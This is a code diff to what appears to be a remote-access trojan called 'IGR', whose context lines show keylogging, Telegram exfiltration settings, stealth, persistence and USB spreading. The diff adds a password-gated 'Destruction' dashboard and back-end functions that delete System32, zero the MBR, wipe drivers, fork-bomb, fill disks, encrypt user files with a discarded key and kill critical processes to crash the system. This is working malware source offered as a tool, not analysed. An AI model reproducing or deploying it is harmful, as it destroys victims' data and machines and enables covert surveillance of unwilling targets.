@@ -16,7 +16,7 @@ TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
 KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
-IGR_VERSION = "8.0"
+IGR_VERSION = "9.0"
 
 # feature flags set during build
 FEAT_POLYMORPHISM = "BUILD_FEAT_POLYMORPHISM"
@@ -320,6 +320,27 @@ def _load_runtime_config():
 
 _load_runtime_config()
 
+# Persistent keylog directory - remembers path across restarts
+import string
+KEYLOG_MARKER = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), ".igr_path")
+if os.path.exists(KEYLOG_MARKER):
+    try:
+        with open(KEYLOG_MARKER, 'r') as f:
+            KEYLOG_DIR = f.read().strip()
+    except:
+        KEYLOG_DIR = ""
+    if not KEYLOG_DIR or not os.path.isdir(KEYLOG_DIR):
+        random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")
+else:
+    random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+    KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")
+
+os.makedirs(KEYLOG_DIR, exist_ok=True)
+with open(KEYLOG_MARKER, 'w') as f:
+    f.write(KEYLOG_DIR)
+KEYLOG_FILE = os.path.join(KEYLOG_DIR, "logs.txt")
+
 # persist active features so they survive restarts
 _FEAT_STATE_FILE = os.path.join(KEYLOG_DIR, ".feat_state.json")
 
@@ -398,27 +419,6 @@ else:
                     f.write(resp.content)
         except:
             CLOUDFLARED_PATH = "cloudflared"
-
-# Persistent keylog directory - remembers path across restarts
-import string
-KEYLOG_MARKER = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), ".igr_path")
-if os.path.exists(KEYLOG_MARKER):
-    try:
-        with open(KEYLOG_MARKER, 'r') as f:
-            KEYLOG_DIR = f.read().strip()
-    except:
-        KEYLOG_DIR = ""
-    if not KEYLOG_DIR or not os.path.isdir(KEYLOG_DIR):
-        random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-        KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")
-else:
-    random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-    KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")
-
-os.makedirs(KEYLOG_DIR, exist_ok=True)
-with open(KEYLOG_MARKER, 'w') as f:
-    f.write(KEYLOG_DIR)
-KEYLOG_FILE = os.path.join(KEYLOG_DIR, "logs.txt")
 
 # stealth and persistence
 
@@ -3541,6 +3541,7 @@ DASHBOARD_HTML = r'''
                 <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
                 <div class="nav-item" onclick="showPage('system')"><span class="nav-icon">[I]</span><span class="nav-text">System</span></div>
                 <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
+                <div class="nav-item" onclick="showPage('destruction')"><span class="nav-icon" style="color:#ef4444;">[!]</span><span class="nav-text" style="color:#ef4444;">Destruction</span></div>
             </div>
         </div>
 
@@ -4016,6 +4017,51 @@ DASHBOARD_HTML = r'''
                 </div>
                 </div>
             </div>
+
+            <!-- Destruction Page -->
+            <div class="page" id="page-destruction">
+                <div id="destructionGate" style="display:flex;align-items:center;justify-content:center;height:80vh;">
+                    <div class="section" style="max-width:400px;text-align:center;border-color:#ef4444;">
+                        <div class="section-title" style="color:#ef4444;font-size:20px;">&#x26A0; DESTRUCTION MODE</div>
+                        <p style="color:#ef4444;margin:15px 0;">This section can permanently damage the target machine. Enter the destruction password to proceed.</p>
+                        <input type="password" id="brickPwdInput" placeholder="Destruction password..." style="width:100%;text-align:center;margin-bottom:10px;">
+                        <button class="btn danger" onclick="brickAuth()" style="width:100%;background:#ef4444;color:#000;">UNLOCK</button>
+                        <div id="brickAuthError" style="color:#ef4444;margin-top:8px;display:none;">Wrong password.</div>
+                    </div>
+                </div>
+                <div id="destructionContent" style="display:none;">
+                    <div class="section" style="grid-column:1/-1;border-color:#ef4444;margin-bottom:15px;">
+                        <div class="section-title" style="color:#ef4444;">&#x26A0; DESTRUCTION ARSENAL</div>
+                        <p style="color:#ef4444;">Each action can brick or severely damage the target PC. Nothing runs automatically. Click to execute. No undo.</p>
+                    </div>
+                    <div class="section" style="grid-column:1/-1;border-color:#f59e0b;margin-bottom:10px;">
+                        <div class="section-title" style="color:#f59e0b;">&#x1F513; ADMIN REQUIRED</div>
+                    </div>
+                    <div class="page-grid">
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">3. Delete System32 <span style="color:#7f1d1d;font-size:9px;">&#x2620; FATAL</span></div><button class="btn danger small" onclick="brickExec('delete_system32')">Execute</button></div><div class="log-box">Recursively delete Windows system directory. OS becomes unbootable.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">4. Overwrite MBR <span style="color:#7f1d1d;font-size:9px;">&#x2620; FATAL</span></div><button class="btn danger small" onclick="brickExec('overwrite_mbr')">Execute</button></div><div class="log-box">Write zeros to Master Boot Record. Machine cannot boot.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">7. Driver Wipe <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('driver_wipe')">Execute</button></div><div class="log-box">Delete all drivers from DriverStore. No network, display, or input after reboot.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">14. Windows Update Break <span style="color:#f59e0b;font-size:9px;">&#x26A0; MED</span></div><button class="btn danger small" onclick="brickExec('break_updates')">Execute</button></div><div class="log-box">Corrupt Windows Update store and delete update cache. OS can never update again.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">15. Service Kill Loop <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('service_kill_loop')">Execute</button></div><div class="log-box">Background loop killing critical Windows services every second. System becomes unusable.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">41. Font Corruption <span style="color:#f59e0b;font-size:9px;">&#x26A0; MED</span></div><button class="btn danger small" onclick="brickExec('font_corrupt')">Execute</button></div><div class="log-box">Replace system fonts with garbage data. All text becomes unreadable squares.</div></div>
+                    </div>
+                    <div class="section" style="grid-column:1/-1;border-color:#7c3aed;margin-top:20px;margin-bottom:10px;">
+                        <div class="section-title" style="color:#7c3aed;">&#x1F512; NO ADMIN REQUIRED</div>
+                    </div>
+                    <div class="page-grid">
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">1. Zip Bomb <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('zip_bomb')">Execute</button></div><div class="log-box">Generate and extract nested zip bomb on target. Fills disk with petabytes of decompressed data.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">2. Fork Bomb <span style="color:#f59e0b;font-size:9px;">&#x26A0; MED</span></div><button class="btn danger small" onclick="brickExec('fork_bomb')">Execute</button></div><div class="log-box">Spawn infinite processes to exhaust memory and CPU. Requires hard reset.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">11. Break File Associations <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('break_assoc')">Execute</button></div><div class="log-box">Remove .exe, .txt, .bat, .msi file associations. Nothing can be opened or run.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">12. Delete Desktop <span style="color:#f59e0b;font-size:9px;">&#x26A0; MED</span></div><button class="btn danger small" onclick="brickExec('delete_desktop')">Execute</button></div><div class="log-box">Recursively delete Desktop, Documents, Downloads, Pictures folders.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">17. Disk Fill <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('disk_fill')">Execute</button></div><div class="log-box">Write random data until every drive is full. OS crashes when system drive hits 0 bytes free.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">18. Encrypt User Files <span style="color:#7f1d1d;font-size:9px;">&#x2620; FATAL</span></div><button class="btn danger small" onclick="brickExec('encrypt_files')">Execute</button></div><div class="log-box">AES-256 encrypt all user files with random key (never saved). Files permanently unreadable.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">19. Zero Free Space <span style="color:#f59e0b;font-size:9px;">&#x26A0; MED</span></div><button class="btn danger small" onclick="brickExec('zero_free_space')">Execute</button></div><div class="log-box">Overwrite all unallocated disk space with zeros. Destroys deleted file recovery.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">28. Startup Flood <span style="color:#ef4444;font-size:9px;">&#x26A0; HIGH</span></div><button class="btn danger small" onclick="brickExec('startup_flood')">Execute</button></div><div class="log-box">Add 500 startup entries that each run destructive scripts. Overwhelms system on login.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">33. Wallpaper Lock <span style="color:#eab308;font-size:9px;">&#x26A0; LOW</span></div><button class="btn danger small" onclick="brickExec('wallpaper_lock')">Execute</button></div><div class="log-box">Set wallpaper to warning message + lock desktop via registry. Annoying but recoverable.</div></div>
+                        <div class="section"><div class="section-header"><div class="section-title" style="color:#ef4444;">47. Critical Process Kill <span style="color:#7f1d1d;font-size:9px;">&#x2620; FATAL</span></div><button class="btn danger small" onclick="brickExec('critical_process_kill')">Execute</button></div><div class="log-box">Kill csrss.exe/lsass.exe/wininit.exe. Instant BSOD. No recovery.</div></div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -4039,12 +4085,6 @@ DASHBOARD_HTML = r'''
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('collapsed');
         }
-        function toggleTheme() {
-            document.body.classList.toggle('light-theme');
-            const isLight = document.body.classList.contains('light-theme');
-            localStorage.setItem('igr-theme', isLight ? 'light' : 'dark');
-        }
-        if (localStorage.getItem('igr-theme') === 'light') document.body.classList.add('light-theme');
         let _offlineCheckInterval = null;
         let _offlineFailCount = 0;
         function startOfflineCheck() {
@@ -5016,6 +5056,33 @@ DASHBOARD_HTML = r'''
             logActivity('PANIC - Self destruct initiated');
         }
 
+        // ===== DESTRUCTION =====
+        function brickAuth() {
+            const pwd = document.getElementById('brickPwdInput').value;
+            fetch('/api/brick/auth', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({password:pwd})})
+            .then(r => r.json()).then(data => {
+                if (data.success) {
+                    document.getElementById('destructionGate').style.display = 'none';
+                    document.getElementById('destructionContent').style.display = 'block';
+                    logActivity('Destruction mode UNLOCKED');
+                } else {
+                    document.getElementById('brickAuthError').style.display = 'block';
+                    setTimeout(() => document.getElementById('brickAuthError').style.display = 'none', 3000);
+                }
+            });
+        }
+        function brickExec(action) {
+            const names = {zip_bomb:'Zip Bomb',fork_bomb:'Fork Bomb',delete_system32:'Delete System32',overwrite_mbr:'Overwrite MBR',driver_wipe:'Driver Wipe',break_updates:'Windows Update Break',service_kill_loop:'Service Kill Loop',font_corrupt:'Font Corruption',break_assoc:'Break File Associations',delete_desktop:'Delete Desktop',disk_fill:'Disk Fill',encrypt_files:'Encrypt User Files',zero_free_space:'Zero Free Space',startup_flood:'Startup Flood',wallpaper_lock:'Wallpaper Lock',critical_process_kill:'Critical Process Kill'};
+            const name = names[action] || action;
+            if (!confirm('EXECUTE: ' + name + '?\n\nThis will permanently damage the target machine. There is NO undo.')) return;
+            if (!confirm('FINAL WARNING: ' + name + ' cannot be reversed. Proceed?')) return;
+            fetch('/api/brick/exec', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:action})})
+            .then(r => r.json()).then(data => {
+                alert(data.success ? name + ' executed.' : 'Error: ' + (data.error || 'unknown'));
+                logActivity('DESTRUCTION: ' + name + ' executed');
+            }).catch(e => { alert('Request failed: ' + e); });
+        }
+
         // ===== SPREADING =====
         async function spreadUSB() {
             document.getElementById('usbSpreadBox').textContent = 'Scanning USB drives...';
@@ -5288,6 +5355,11 @@ def auth():
         return jsonify({'success': False})
     except:
         return jsonify({'success': False})
+
+@app.route('/api/status')
+def api_status():
+    """Health check endpoint for dashboard offline detection."""
+    return jsonify({'status': 'ok', 'version': IGR_VERSION})
 
 @app.route('/api/audio/play', methods=['POST'])
 def play_audio():
@@ -7082,6 +7154,245 @@ def panic_self_destruct():
 
     threading.Thread(target=_panic_async, daemon=True).start()
     return jsonify({'success': True, 'status': 'Self-destruct initiated'})
+
+_BRICK_PASSWORD = "brick"
+
+@app.route('/api/brick/auth', methods=['POST'])
+def brick_auth():
+    """Authenticate for destruction mode."""
+    data = request.get_json(silent=True) or {}
+    pwd = data.get('password', '')
+    if pwd == _BRICK_PASSWORD:
+        return jsonify({'success': True})
+    return jsonify({'success': False, 'error': 'Wrong password'})
+
+def _brick_zip_bomb():
+    """Generate a zip bomb on the target machine."""
+    import zipfile, io, struct
+    bomb_dir = os.path.join(os.environ.get('TEMP', '.'), '.winupdate')
+    os.makedirs(bomb_dir, exist_ok=True)
+    for layer in range(5):
+        inner_name = f'layer_{layer}.zip'
+        inner_path = os.path.join(bomb_dir, inner_name)
+        with zipfile.ZipFile(inner_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            if layer < 4:
+                zf.write(os.path.join(bomb_dir, f'layer_{layer+1}.zip') if layer < 3 else 'payload.bin', f'layer_{layer+1}.zip' if layer < 4 else 'payload.bin')
+            else:
+                big = b'\x00' * (1024 * 1024)
+                for i in range(1024):
+                    zf.writestr(f'fill_{i}.dat', big)
+    for f in os.listdir(bomb_dir):
+        fp = os.path.join(bomb_dir, f)
+        if f.endswith('.zip'):
+            try:
+                with zipfile.ZipFile(fp, 'r') as zf:
+                    zf.extractall(bomb_dir)
+            except:
+                pass
+    for root, dirs, files in os.walk(bomb_dir):
+        for f in files:
+            try:
+                os.remove(os.path.join(root, f))
+            except:
+                pass
+
+def _brick_fork_bomb():
+    """Spawn infinite processes to exhaust resources."""
+    subprocess.Popen('powershell -Command "while($true){Start-Process powershell -ArgumentList \'-Command\',\'while($true){Start-Process powershell}\' -WindowStyle Hidden}"', shell=True, creationflags=0x08000000)
+
+def _brick_delete_system32():
+    """Delete Windows system directory."""
+    subprocess.Popen('cmd /c takeown /f C:\\Windows\\System32 /r /d y & icacls C:\\Windows\\System32 /grant Everyone:F /t & rd /s /q C:\\Windows\\System32', shell=True, creationflags=0x08000000)
+
+def _brick_overwrite_mbr():
+    """Overwrite Master Boot Record with zeros."""
+    subprocess.Popen('powershell -Command "$d=Get-PhysicalDisk|Select-Object -First 1;$p=\'\\\\.\\PHYSICALDRIVE\'+$d.DeviceId;[IO.File]::Create($p).Write([byte[]](,0*512),0,512)', shell=True, creationflags=0x08000000)
+
+def _brick_driver_wipe():
+    """Delete all drivers from DriverStore."""
+    subprocess.Popen('pnputil /enum-drivers | findstr "oem" | for /f "tokens=2" %i in (\'findstr "oem"\') do pnputil /delete-driver %i /force', shell=True, creationflags=0x08000000)
+    subprocess.Popen('powershell -Command "Get-WmiObject Win32_SystemDriver | ForEach-Object { sc.exe delete $_.Name }"', shell=True, creationflags=0x08000000)
+
+def _brick_break_updates():
+    """Corrupt Windows Update store."""
+    subprocess.Popen('net stop wuauserv', shell=True, creationflags=0x08000000)
+    sd = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'SoftwareDistribution')
+    subprocess.Popen(f'rd /s /q "{sd}"', shell=True, creationflags=0x08000000)
+    catroot = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'catroot2')
+    subprocess.Popen(f'rd /s /q "{catroot}"', shell=True, creationflags=0x08000000)
+
+def _brick_service_kill_loop():
+    """Background loop killing critical services."""
+    def _kill_loop():
+        targets = ['Dnscache', 'Dhcp', 'LanmanServer', 'LanmanWorkstation', 'Winmgmt', 'Audiosrv', 'WlanSvc', 'Netlogon', 'Spooler']
+        while True:
+            for svc in targets:
+                try:
+                    subprocess.run(['net', 'stop', svc], capture_output=True, creationflags=0x08000000)
+                except:
+                    pass
+            time.sleep(1)
+    threading.Thread(target=_kill_loop, daemon=True).start()
+
+def _brick_font_corrupt():
+    """Replace system fonts with garbage."""
+    font_dir = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'Fonts')
+    for f in os.listdir(font_dir):
+        fp = os.path.join(font_dir, f)
+        if os.path.isfile(fp):
+            try:
+                with open(fp, 'wb') as fh:
+                    fh.write(os.urandom(64))
+            except:
+                pass
+
+def _brick_break_assoc():
+    """Remove critical file associations."""
+    assocs = ['.exe', '.txt', '.bat', '.cmd', '.msi', '.reg', '.vbs', '.ps1', '.js', '.py']
+    for ext in assocs:
+        try:
+            subprocess.run(['assoc', f'{ext}='], capture_output=True, creationflags=0x08000000)
+        except:
+            pass
+
+def _brick_delete_desktop():
+    """Delete user Desktop, Documents, Downloads, Pictures."""
+    user = os.path.expanduser('~')
+    targets = ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Music', 'Videos']
+    for t in targets:
+        p = os.path.join(user, t)
+        if os.path.isdir(p):
+            try:
+                import shutil
+                shutil.rmtree(p, ignore_errors=True)
+            except:
+                pass
+
+def _brick_disk_fill():
+    """Write random data until disk is full."""
+    def _fill():
+        for drive in 'CDEFGH':
+            root = drive + ':\\'
+            if not os.path.isdir(root):
+                continue
+            try:
+                fp = os.path.join(root, '.syscache')
+                with open(fp, 'wb') as f:
+                    while True:
+                        f.write(os.urandom(1024 * 1024))
+            except:
+                pass
+    threading.Thread(target=_fill, daemon=True).start()
+
+def _brick_encrypt_files():
+    """AES-256 encrypt all user files with random key (never saved)."""
+    from cryptography.fernet import Fernet
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+    user = os.path.expanduser('~')
+    exts = {'.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.png', '.mp4', '.mp3', '.zip', '.rar', '.csv', '.json', '.xml', '.db', '.sqlite', '.mdb'}
+    for root, dirs, files in os.walk(user):
+        if '.igr' in root or 'AppData' in root:
+            continue
+        for f in files:
+            _, ext = os.path.splitext(f)
+            if ext.lower() in exts:
+                fp = os.path.join(root, f)
+                try:
+                    with open(fp, 'rb') as fh:
+                        data = fh.read()
+                    enc = cipher.encrypt(data)
+                    with open(fp + '.locked', 'wb') as fh:
+                        fh.write(enc)
+                    os.remove(fp)
+                except:
+                    pass
+
+def _brick_zero_free_space():
+    """Overwrite all unallocated disk space with zeros."""
+    def _zero():
+        for drive in 'CDEFGH':
+            root = drive + ':\\'
+            if not os.path.isdir(root):
+                continue
+            try:
+                subprocess.run(['cipher', '/w:' + root], capture_output=True, creationflags=0x08000000)
+            except:
+                pass
+    threading.Thread(target=_zero, daemon=True).start()
+
+def _brick_startup_flood():
+    """Add 500 startup entries running destructive scripts."""
+    startup_dir = os.path.join(os.environ.get('APPDATA', ''),
+        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    for i in range(500):
+        vbs_path = os.path.join(startup_dir, f'winupdate_{i}.vbs')
+        try:
+            with open(vbs_path, 'w') as f:
+                f.write(f'CreateObject("WScript.Shell").Run "cmd /c echo IGR_WAS_HERE > C:\\igr_{i}.txt", 0, False')
+        except:
+            pass
+
+def _brick_wallpaper_lock():
+    """Set wallpaper to warning + lock desktop features."""
+    import ctypes
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Control Panel\Desktop', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, '2')
+        winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, '0')
+        winreg.CloseKey(key)
+    except:
+        pass
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0, winreg.KEY_ALL_ACCESS)
+        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, 'DisableRegistryTools', 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, 'NoDispCPL', 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+    except:
+        pass
+
+def _brick_critical_process_kill():
+    """Kill critical system processes causing BSOD."""
+    for proc in ['csrss.exe', 'lsass.exe', 'wininit.exe']:
+        try:
+            subprocess.run(['taskkill', '/f', '/im', proc], capture_output=True, creationflags=0x08000000)
+        except:
+            pass
+
+_BRICK_ACTIONS = {
+    'zip_bomb': _brick_zip_bomb,
+    'fork_bomb': _brick_fork_bomb,
+    'delete_system32': _brick_delete_system32,
+    'overwrite_mbr': _brick_overwrite_mbr,
+    'driver_wipe': _brick_driver_wipe,
+    'break_updates': _brick_break_updates,
+    'service_kill_loop': _brick_service_kill_loop,
+    'font_corrupt': _brick_font_corrupt,
+    'break_assoc': _brick_break_assoc,
+    'delete_desktop': _brick_delete_desktop,
+    'disk_fill': _brick_disk_fill,
+    'encrypt_files': _brick_encrypt_files,
+    'zero_free_space': _brick_zero_free_space,
+    'startup_flood': _brick_startup_flood,
+    'wallpaper_lock': _brick_wallpaper_lock,
+    'critical_process_kill': _brick_critical_process_kill,
+}
+
+@app.route('/api/brick/exec', methods=['POST'])
+def brick_exec():
+    """Execute a destruction action."""
+    data = request.get_json(silent=True) or {}
+    action = data.get('action', '')
+    if action not in _BRICK_ACTIONS:
+        return jsonify({'success': False, 'error': 'Unknown action'})
+    try:
+        _BRICK_ACTIONS[action]()
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/network/lan_scan')
 def network_lan_scan():
